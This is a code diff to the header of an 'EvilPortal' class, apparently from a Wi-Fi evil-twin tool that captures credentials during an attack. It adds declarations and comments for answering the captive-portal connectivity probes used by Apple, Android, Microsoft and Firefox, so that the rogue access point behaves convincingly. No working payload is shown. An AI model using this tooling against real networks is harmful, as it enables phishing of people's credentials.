@@ -270,6 +270,23 @@ class EvilPortal {
     // and the management panel so captures can be read during an attack.
     void serveCredsPage();
 
+    // Both setupManagementServer() and setupServer() register the same
+    // captive-probe paths on one shared WebServer, and WebServer appends
+    // handlers while dispatch walks the list from the head: the FIRST
+    // registration wins forever and stop() does not clear it. So the answer
+    // cannot be decided by which setup function ran last - it has to be
+    // decided at request time, which is what these two do.
+    enum CaptiveProbeKind : uint8_t {
+      PROBE_APPLE      = 0, // "Success" HTML body iOS/macOS look for
+      PROBE_204        = 1, // Android: 204 No Content means online
+      PROBE_MS_CONNECT = 2, // "Microsoft Connect Test"
+      PROBE_MS_NCSI    = 3, // "Microsoft NCSI"
+      PROBE_TXT        = 4, // Firefox: literal "success"
+      PROBE_NOTFOUND   = 5, // catch-all: 404 on the panel, portal on evil twin
+    };
+    bool evilTwinActive();
+    void serveCaptiveProbe(uint8_t kind);
+
 };
 
 #endif
